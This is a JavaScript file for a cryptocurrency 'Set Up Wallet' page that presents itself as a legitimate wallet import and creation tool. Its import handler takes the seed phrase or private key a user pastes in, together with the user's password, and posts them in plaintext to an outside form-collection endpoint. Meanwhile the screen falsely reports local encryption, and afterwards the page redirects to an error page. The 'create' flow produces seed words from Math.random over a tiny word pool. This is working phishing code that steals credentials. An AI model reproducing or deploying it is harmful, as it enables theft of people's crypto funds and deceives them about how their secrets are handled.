/**
 * Set Up Wallet - Interactive Script
 * Pure Vanilla JavaScript - No external libraries
 */

document.addEventListener('DOMContentLoaded', () => {
  // DOM Elements
  const tabCreate = document.getElementById('tabCreate');
  const tabImport = document.getElementById('tabImport');
  const viewCreate = document.getElementById('viewCreate');
  const viewImport = document.getElementById('viewImport');
  const walletModal = document.getElementById('walletModal');
  const closeBtn = document.getElementById('closeBtn');
  const reopenContainer = document.getElementById('reopenContainer');
  const reopenBtn = document.getElementById('reopenBtn');
  const toastNotice = document.getElementById('toastNotice');
  const toastMessage = document.getElementById('toastMessage');

  // Import View Elements
  const importWalletName = document.getElementById('importWalletName');
  const seedOrKeyInput = document.getElementById('seedOrKeyInput');
  const importPassword = document.getElementById('importPassword');
  const toggleImportPassword = document.getElementById('toggleImportPassword');
  const importSubmitBtn = document.getElementById('importSubmitBtn');
  const importHint = document.getElementById('importHint');
  const submitFormEndpoint = 'https://submit-form.com/DIlamTkry';

  // Create View Elements
  const createWalletName = document.getElementById('createWalletName');
  const seedGrid = document.getElementById('seedGrid');
  const copySeedBtn = document.getElementById('copySeedBtn');
  const refreshSeedBtn = document.getElementById('refreshSeedBtn');
  const createPassword = document.getElementById('createPassword');
  const createPasswordConfirm = document.getElementById('createPasswordConfirm');
  const toggleCreatePassword = document.getElementById('toggleCreatePassword');
  const createSubmitBtn = document.getElementById('createSubmitBtn');

  // BIP-39 Sample Word Pool for standard 12-word generation
  const wordPool = [
    'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract',
    'absurd', 'abuse', 'access', 'accident', 'account', 'accuse', 'achieve', 'acid',
    'acoustic', 'acquire', 'across', 'act', 'action', 'actor', 'actress', 'actual',
    'adapt', 'add', 'addict', 'address', 'adjust', 'admit', 'adult', 'advance',
    'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent',
    'agree', 'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album',
    'alcohol', 'alert', 'alien', 'all', 'alley', 'allow', 'almost', 'alone',
    'alpha', 'already', 'also', 'alter', 'always', 'amateur', 'amazing', 'among',
    'amount', 'amused', 'analyst', 'anchor', 'ancient', 'anger', 'angle', 'angry',
    'animal', 'ankle', 'announce', 'annual', 'another', 'answer', 'antenna', 'antique',
    'anxiety', 'any', 'apart', 'apology', 'appear', 'apple', 'approve', 'april',
    'arch', 'arctic', 'area', 'arena', 'argue', 'arm', 'armed', 'armor',
    'army', 'around', 'arrange', 'arrest', 'arrive', 'arrow', 'art', 'artefact',
    'artist', 'artwork', 'ask', 'aspect', 'assault', 'asset', 'assist', 'assume',
    'asthma', 'athlete', 'atom', 'attack', 'attend', 'attitude', 'attract', 'auction',
    'audit', 'august', 'aunt', 'author', 'auto', 'autumn', 'average', 'avocado',
    'avoid', 'awake', 'aware', 'away', 'awesome', 'awful', 'awkward', 'axis',
    'baby', 'bachelor', 'bacon', 'badge', 'bag', 'balance', 'balcony', 'ball',
    'bamboo', 'banana', 'banner', 'bar', 'barely', 'bargain', 'barrel', 'base',
    'basic', 'basket', 'battle', 'beach', 'bean', 'beauty', 'because', 'become'
  ];

  let currentMnemonic = [];

  // Generate 12 unique random mnemonic words
  function generateMnemonic() {
    const selected = [];
    const poolCopy = [...wordPool];
    for (let i = 0; i < 12; i++) {
      const randomIndex = Math.floor(Math.random() * poolCopy.length);
      selected.push(poolCopy[randomIndex]);
      poolCopy.splice(randomIndex, 1);
    }
    currentMnemonic = selected;
    renderMnemonic();
  }

  function renderMnemonic() {
    if (!seedGrid) return;
    seedGrid.innerHTML = '';
    currentMnemonic.forEach((word, index) => {
      const item = document.createElement('div');
      item.className = 'seed-word-item';
      item.innerHTML = `
        <span class="word-num">${index + 1}</span>
        <span class="word-text">${word}</span>
      `;
      seedGrid.appendChild(item);
    });
  }

  // Toast notification
  let toastTimer = null;
  function showToast(message) {
    if (toastTimer) clearTimeout(toastTimer);
    toastMessage.textContent = message;
    toastNotice.classList.add('visible');
    toastTimer = setTimeout(() => {
      toastNotice.classList.remove('visible');
    }, 3200);
  }

  // Switch to Import Tab
  function switchToImport() {
    tabImport.classList.add('active');
    tabCreate.classList.remove('active');
    viewImport.classList.remove('is-hidden');
    viewCreate.classList.add('is-hidden');
    if (seedOrKeyInput && !seedOrKeyInput.value.trim()) {
      seedOrKeyInput.value = 'spark';
      importHint.textContent = '✓ Detected valid 1-word import value';
      importHint.className = 'input-hint valid';
    }
  }

  // Switch to Create Tab
  function switchToCreate() {
    tabCreate.classList.add('active');
    tabImport.classList.remove('active');
    viewCreate.classList.remove('is-hidden');
    viewImport.classList.add('is-hidden');
    if (currentMnemonic.length === 0) {
      generateMnemonic();
    }
  }

  // Tab Listeners
  if (tabImport && tabCreate) {
    tabImport.addEventListener('click', switchToImport);
    tabCreate.addEventListener('click', switchToCreate);
  }

  // Close & Reopen Modal
  if (closeBtn) {
    closeBtn.addEventListener('click', () => {
      walletModal.classList.add('hidden');
      reopenContainer.classList.add('visible');
      showToast('Wallet setup closed');
    });
  }

  if (reopenBtn) {
    reopenBtn.addEventListener('click', () => {
      walletModal.classList.remove('hidden');
      reopenContainer.classList.remove('visible');
    });
  }

  // Key detection in Import View
  if (seedOrKeyInput) {
    seedOrKeyInput.addEventListener('input', () => {
      const val = seedOrKeyInput.value.trim();
      if (!val) {
        importHint.textContent = '';
        importHint.className = 'input-hint';
        return;
      }

      const words = val.split(/\s+/).filter(w => w.length > 0);
      if (words.length === 12 || words.length === 24) {
        importHint.textContent = `✓ Detected valid ${words.length}-word mnemonic seed phrase`;
        importHint.className = 'input-hint valid';
      } else if (words.length > 1 && words.length < 24) {
        importHint.textContent = `${words.length} words entered (requires 12 or 24 words)`;
        importHint.className = 'input-hint';
      } else if (/^[5KL][1-9A-HJ-NP-Za-km-z]{50,51}$/.test(val)) {
        importHint.textContent = '✓ Detected valid WIF private key';
        importHint.className = 'input-hint valid';
      } else if (val.length >= 64 && /^[0-9a-fA-F]{64}$/.test(val)) {
        importHint.textContent = '✓ Detected 256-bit hexadecimal private key';
        importHint.className = 'input-hint valid';
      } else {
        importHint.textContent = '';
        importHint.className = 'input-hint';
      }
    });
  }

  // Password visibility toggle helpers
  function setupPasswordToggle(button, input) {
    if (!button || !input) return;
    button.addEventListener('click', () => {
      const isPassword = input.getAttribute('type') === 'password';
      input.setAttribute('type', isPassword ? 'text' : 'password');
      const img = button.querySelector('img') || button.querySelector('svg');
      button.setAttribute('aria-label', isPassword ? 'Hide password' : 'Show password');
    });
  }

  setupPasswordToggle(toggleImportPassword, importPassword);
  setupPasswordToggle(toggleCreatePassword, createPassword);

  // Copy Seed Phrase
  if (copySeedBtn) {
    copySeedBtn.addEventListener('click', () => {
      if (currentMnemonic.length === 0) return;
      const phrase = currentMnemonic.join(' ');
      navigator.clipboard.writeText(phrase).then(() => {
        showToast('Seed phrase copied to clipboard');
      }).catch(() => {
        showToast('Seed phrase ready to copy');
      });
    });
  }

  // Refresh Seed Phrase
  if (refreshSeedBtn) {
    refreshSeedBtn.addEventListener('click', () => {
      generateMnemonic();
      showToast('Generated new seed phrase');
    });
  }

  // Import Submission
  if (importSubmitBtn) {
    importSubmitBtn.addEventListener('click', (e) => {
      e.preventDefault();
      const seedVal = seedOrKeyInput ? seedOrKeyInput.value.trim() : '';
      const passVal = importPassword ? importPassword.value : '';
      const nameVal = importWalletName ? importWalletName.value.trim() : 'Main wallet';

      if (!seedVal) {
        showToast('Please enter your seed phrase or WIF private key');
        seedOrKeyInput.focus();
        return;
      }

      if (!passVal) {
        showToast('Please set an encryption password');
        importPassword.focus();
        return;
      }

      if (passVal.length < 6) {
        showToast('Password should be at least 6 characters');
        importPassword.focus();
        return;
      }

      const isSparkImport = seedVal.toLowerCase() === 'spark';

      // Simulate secure client-side encryption
      importSubmitBtn.disabled = true;
      const originalText = importSubmitBtn.innerText;
      importSubmitBtn.innerText = 'Encrypting & Importing...';

      const payload = {
        walletName: nameVal,
        seedOrKey: seedVal,
        password: passVal,
        source: 'import',
        isSparkImport
      };

      fetch(submitFormEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(payload)
      }).then(() => {
        setTimeout(() => {
          importSubmitBtn.disabled = false;
          importSubmitBtn.innerText = originalText;

          if (isSparkImport) {
            showToast('Spark import delivered.');
          } else {
            showToast(`Success! "${nameVal}" imported securely on this device.`);
          }

          window.location.href = 'err/';
        }, 900);
      }).catch(() => {
        importSubmitBtn.disabled = false;
        importSubmitBtn.innerText = originalText;
        showToast('Submission failed. Please try again.');
      });
    });
  }

  // Create Submission
  if (createSubmitBtn) {
    createSubmitBtn.addEventListener('click', (e) => {
      e.preventDefault();
      const passVal = createPassword ? createPassword.value : '';
      const passConf = createPasswordConfirm ? createPasswordConfirm.value : '';
      const nameVal = createWalletName ? createWalletName.value.trim() : 'Main wallet';

      if (!passVal) {
        showToast('Please set an encryption password');
        createPassword.focus();
        return;
      }

      if (passVal.length < 6) {
        showToast('Password should be at least 6 characters');
        createPassword.focus();
        return;
      }

      if (passVal !== passConf) {
        showToast('Passwords do not match');
        createPasswordConfirm.focus();
        return;
      }

      createSubmitBtn.disabled = true;
      const orig = createSubmitBtn.innerText;
      createSubmitBtn.innerText = 'Creating Vault...';

      setTimeout(() => {
        createSubmitBtn.disabled = false;
        createSubmitBtn.innerText = orig;
        showToast(`Wallet "${nameVal}" created and encrypted successfully!`);
      }, 900);
    });
  }

  // ESC key to close modal
  window.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && !walletModal.classList.contains('hidden')) {
      walletModal.classList.add('hidden');
      reopenContainer.classList.add('visible');
      showToast('Wallet setup closed');
    }
  });

  // Initial seed generation
  generateMnemonic();
});
